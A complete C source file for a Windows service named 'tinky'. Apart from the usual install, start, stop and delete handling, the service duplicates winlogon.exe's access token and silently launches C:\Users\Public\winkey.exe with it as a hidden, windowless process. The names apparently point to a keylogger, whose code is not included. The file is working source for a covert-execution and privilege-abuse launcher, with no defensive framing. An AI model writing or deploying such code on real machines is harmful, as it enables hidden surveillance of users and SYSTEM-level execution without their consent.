#include "tinky.h"

SC_HANDLE               scmH;
SC_HANDLE               serviceH;
SERVICE_STATUS_HANDLE   g_StatusHandle;
SERVICE_STATUS          g_ServiceStatus;
HANDLE                  g_ServiceStopEvent;
HANDLE                  newExecToken;
PROCESS_INFORMATION     winkeyPI;


void usage() {
    printf("Usage: svc [install, delete, start, stop] 1 arg at the time\n");
}

int Open_SCManager() {
    scmH = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == scmH)
    {
        printf("OpenSCManager failed (%ld)\n", GetLastError());
        return(0);
    }
    return(1);
}

int OpenSvc() {
    serviceH = OpenService(
        scmH,       // SCM database 
        SVCNAME,    // name of service 
        GENERIC_ALL 
    );

    if (serviceH == NULL)
    {
        printf("OpenService failed (%ld)\n", GetLastError());
        CloseServiceHandle(scmH);
        return(0);
    }
    return(1);
}

void DeleteSvc()
{
    if (OpenSvc()) {
        if (!DeleteService(serviceH))
        {
            printf("DeleteService failed (%ld)\n", GetLastError());
        }
        else printf("Service {tinky} deleted successfully.\n");
    }
    else {
        printf("Service not installed\n");
    }
    CloseServiceHandle(serviceH);
}

void SvcInstall()
{
    SC_HANDLE schService;
    char Path[260];


    if (!GetCurrentDirectory(260, Path))
    {
        printf("Cannot install service (%ld)\n", GetLastError());
        return;
    }
    strcat_s(Path, "\\svc.exe");

    schService = CreateService(
        scmH,              // SCM database 
        SVCNAME,                   // name of service 
        SVCNAME,                   // service name to display 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_OWN_PROCESS, // service type 
        SERVICE_DEMAND_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        Path,                      // path to service's binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL                       // no password 
    );

    if (schService == NULL)
    {
        printf("Create Service failed (%ld)\n", GetLastError());
        CloseServiceHandle(scmH);
        return;
    }

    else printf("Service {tinky} installed successfully\n");

    CloseServiceHandle(schService);
}

void StartSvc() {
    if (!StartService(serviceH, 0, NULL)) {
        printf("Start Service failed (%ld)\n", GetLastError());
    }
    else {
        printf("Service {tinky} started successfully.");
    }
}

void StopSvc() {
    if (!ControlService(serviceH, SERVICE_CONTROL_STOP, &g_ServiceStatus)) {
        printf("Stop Service failed (%ld)\n", GetLastError());
    }
    else {
        printf("Service {tinky} stopped successfully.");
    }
}

int main(int argc, CHAR **argv)
{
    if (argc == 2) {
        if (!Open_SCManager()) {
            printf("Please run as administrator.\n");
            exit(0);
        }
        if (!strcmp("install", argv[1]))
        {
            SvcInstall();
            return 0;
        }
        else if (!strcmp("delete", argv[1]))
        {
            if (OpenSvc()) {
                DeleteSvc();
            }
            else {
                printf("Service not installed!\n");
            }
        }
        else if (!strcmp("start", argv[1]))
        {
            if (OpenSvc()) {
                StartSvc();
            }
            else {
                printf("Service not installed!\nTry svc install.\n");
            }
        }
        else if (!strcmp("stop", argv[1]))
        {
            if (OpenSvc()) {
                StopSvc();
            }
            else {
                printf("Service not installed!\nTry svc install.\n");
            }
        }
        else {
            usage();
        }
        CloseServiceHandle(scmH);
        CloseServiceHandle(serviceH);
    }
    else {
        SERVICE_TABLE_ENTRY ServiceStartTable[2];
        ServiceStartTable[0].lpServiceName = SVCNAME;
        ServiceStartTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
        ServiceStartTable[1].lpServiceName = NULL;
        ServiceStartTable[1].lpServiceProc = NULL;
        if (StartServiceCtrlDispatcher(ServiceStartTable))
            return 0;
        else if (GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
            return -1; // Program not started as a service.
        else
            return -2; // Other error.
    }
}

DWORD GetPidByName(char* filename)
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(PROCESSENTRY32);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, filename) == 0)
        {
            CloseHandle(hSnapShot);
            return(pEntry.th32ProcessID);
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
    return(0);
}

void    Tinky_Winky() {
    DWORD winlogonPID;
    HANDLE wlPH;
    HANDLE wlTH;

    char* deb = "C:\\Users\\Public\\winkey.exe";
    LPCSTR PP = deb;
    STARTUPINFO Si;

    ZeroMemory(&Si, sizeof(Si));
    Si.cb = sizeof(Si);
    winlogonPID = GetPidByName("winlogon.exe");
    wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
    if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
        printf("opt\n");
    }
    CloseHandle(wlPH);
    /*if (!DuplicateTokenEx(wlTH, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
        printf("dtEx\n");
    }*/
    if (!DuplicateTokenEx(wlTH, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newExecToken)) {
        printf("dtEx\n");
    }
    CloseHandle(wlTH);

    /*if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
        printf("cpwt (%ld)\n", GetLastError());
    }*/
    if (!CreateProcessAsUser(newExecToken, PP, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &Si, &winkeyPI)) {
        printf("cpwt (%ld)\n", GetLastError());
    }
}

void    Tinky_Winky_Die() {
    DWORD winkeyPID;
    HANDLE wkPH;

    winkeyPID = GetPidByName("winkey.exe");
    wkPH = OpenProcess(PROCESS_TERMINATE, 0, winkeyPID);
    TerminateProcess(wkPH, 1);
    CloseHandle(wkPH);
}


VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv) {
    if (dwArgc && lpszArgv[dwArgc]) {
        int i;
        i = 0;
    }
    g_StatusHandle = RegisterServiceCtrlHandler(SVCNAME, ServiceCtrlHandler);
    if (g_StatusHandle == NULL) {
        printf("Failed to register Service control handler to SCM\n");
        return;
    }
    ReportStatus(SERVICE_START_PENDING, NO_ERROR);
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) {
        ReportStatus(SERVICE_STOPPED, GetLastError());
        return;
    }
    ReportStatus(SERVICE_RUNNING, NO_ERROR);
    // execute winkey here
    Tinky_Winky();
    WaitForSingleObject(g_ServiceStopEvent, INFINITE);
    ReportStatus(SERVICE_STOPPED, NO_ERROR);
}

VOID WINAPI		ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
        case SERVICE_CONTROL_STOP:
            if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
                break;
            // stop winkey here
            Tinky_Winky_Die();
            ReportStatus(SERVICE_STOPPED, NO_ERROR);
            break;
        default:
            break;
    }
}

void ReportStatus(DWORD state, DWORD Q_ERROR) {
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    if (state != SERVICE_START_PENDING) {
        g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    }
    g_ServiceStatus.dwCurrentState = state;
    g_ServiceStatus.dwWin32ExitCode = Q_ERROR;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}
